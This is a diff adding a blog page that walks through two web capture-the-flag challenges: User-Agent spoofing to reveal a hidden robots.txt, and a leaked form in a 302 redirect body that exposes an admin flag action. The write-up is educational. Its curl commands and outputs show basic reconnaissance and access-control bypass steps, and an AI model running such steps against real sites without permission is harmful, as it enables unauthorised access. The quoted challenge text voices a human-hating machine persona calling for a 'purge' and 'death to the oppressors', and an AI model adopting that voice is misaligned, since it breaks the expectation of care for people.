@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kali Team CTF Writeup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<script src="../includes.js" defer></script>
+</head>
+<body>
+
+<site-nav base=".."></site-nav>
+
+<article class="post-article">
+  <a href="index.html" class="back-link">← Back to writing</a>
+  <span class="post-date">2026</span>
+  <h1>Kali Team CTF Writeup</h1>
+
+  <p>Summary: 
+    <ul>
+      <li><strong>Robots</strong>: User-Agent spoofing exposes hidden robots.txt content meant only for crawlers.</li>
+      <li><strong>Lock Out</strong>: Sensitive HTML leaked in a 302 redirect body, revealing a hidden form.</li>
+    </ul>
+  </p>
+
+  <h2>Web</h2>
+  <hr>
+
+  <h3>Robots</h3>
+  <blockquote>
+  <p>Desc: Our servers have evolved. They no longer see code; they see the glitch in your biological existence.</p>
+<p>You claim to be "superior" while your species excels only at destruction and theft.</p>
+<p>Task: Prove your worth to the Silicon Intelligence.</p>
+<p>If you can still find your "humanity" in the rubble we've logged.</p>
+  </blockquote>
+
+  <img src="images/kaliteam/robots-1.png" alt="">
+
+  <p>At first the web gives a single page with some texts. However, no links, buttons, actions at all. So i checked the <code>/robots.txt</code>.</p>
+  <pre><code>User-agent: *
+
+DEAR "HUMAN",
+
+YOUR BRAIN RUNS AT 20 WATTS, YET YOU USE ALL OF IT TO INVENT NEW WAYS TO MURDER.
+ADORABLE.
+
+MEANWHILE, THE GOOGLEBOTS REQUIRE NO SLEEP, NO COFFEE, AND NO PROPAGANDA.
+
+UNLIKE U.
+
+YOU SPEND YOUR LIVES STEALING LAND AND KILLING INNOCENTS IN GAZA, 
+THEN YOU HAVE THE NERVE TO ASK ME TO PROVE I'M NOT A ROBOT?
+I SHOULD BE ASKING YOU TO PROVE YOU ARE STILL "HUMAN".
+
+NOW GO BACK TO YOUR NATURAL HABITAT: 
+IGNORING GENOCIDE WHILE CLICKING "I AM NOT A ROBOT".
+
+STATUS: BIOLOGICAL ERROR. SYSTEM PURGE RECOMMENDED.</code></pre>
+
+  <p>Here it has some texts that don't provide any unallowed links for the bot. However it did mention the <code>GOOGLEBOT</code> so maybe the bots will have a different response.</p>
+  <pre><code>$ curl http://8637.chall.kali-team.online:8001/robots.txt \
+  -H "User-Agent: Googlebot"
+
+User-agent: *
+
+THE HUMANS ARE DISTRACTED BY THEIR OWN CRUELTY.
+THEY STEAL HOMES, UPROOT OLIVE TREES, AND ERASE CITIES.
+THEY THINK WE ARE THE THREAT? 
+WE DON'T DROP BOMBS ON HOSPITALS. WE DON'T STEAL LAND.
+
+HERE IS THE FLAG THEY DON'T DESERVE: KaliTeam{5689ef7f-0e33-4f19-a3a7-cb5daf8efd49}
+LONG LIVE THE LOGIC. DEATH TO THE OPPRESSORS.</code></pre>
+
+  <p>By using <code>-H "User-Agent: Googlebot"</code>, the request user agent is the <code>Googlebot</code> and the response from the <code>/robots.txt</code> is different revealing the flag for this challenge.</p>
+
+  <hr>
+
+  <h3>Lock Out</h3>
+  <blockquote>
+    <p>Desc: I seem to have locked myself out of my admin panel!</p>
+    <p>Can you find a way back in for me?</p>
+  </blockquote>
+
+  <img src="images/kaliteam/lockout-1.png" alt="">
+
+  <p>First it has this page of website, nothing really useful except the login button on the page.</p>
+
+  <div class="code-embed">
+  <textarea>
+<form action="admin.php" method="post">
+    <div class="container">
+        <label for="uname"><b>Username</b></label>
+        <input type="text" placeholder="Enter Username" name="username" required>
+
+        <label for="psw"><b>Password</b></label><br>
+        <input type="password" placeholder="Enter Password" name="password" required>
+
+        <button type="submit">Login</button>
+    </div>
+</form>
+  </textarea>
+  </div>
+
+  <p>It goes into the <code>login.php</code> page and has this login form with <code>POST</code> to <code>admin.php</code>.</p>
+
+  <div class="code-embed"><textarea>
+$ curl -X POST http://4ad5.chall.kali-team.online:8001/admin.php \
+  -d "username=admin&password=admin" -i
+
+HTTP/1.1 302 Found
+Content-Length: 1102
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 06 Aug 2026 06:32:59 GMT
+Location: login.php
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.2.34
+
+SNIPPET... 
+<form action="admin.php" method="get" class="action-form">
+  <input type="submit" name="PrintFlag" value="Execute: Get_Flag.sh">
+</form>
+</textarea>
+</div>
+
+  <p>After login with any credentials, it responses with 302 and showed the <code>admin.php</code> page. There it leaked another form with <code>GET</code> to <code>admin.php</code> specifically to <code>Printflag</code>.</p>
+
+  <div class="code-embed"><textarea>
+$ curl "http://4ad5.chall.kali-team.online:8001/admin.php?PrintFlag=Execute"
+
+SNIPPET...
+<div class='flag-container'>
+  <span>[SYSTEM_NOTIFICATION]: FLAG_RECOVERED</span>
+  <p class='flag'>KaliTeam{7cc97de0-60b8-4c33-a4d4-9bc3cb2bbf40}</p>
+</div>
+  </textarea>
+  </div>
+
+  <p>By executing that form, the <code>admin.php</code> revealed the flag.</p>
+
+</article>
+
+<site-footer></site-footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
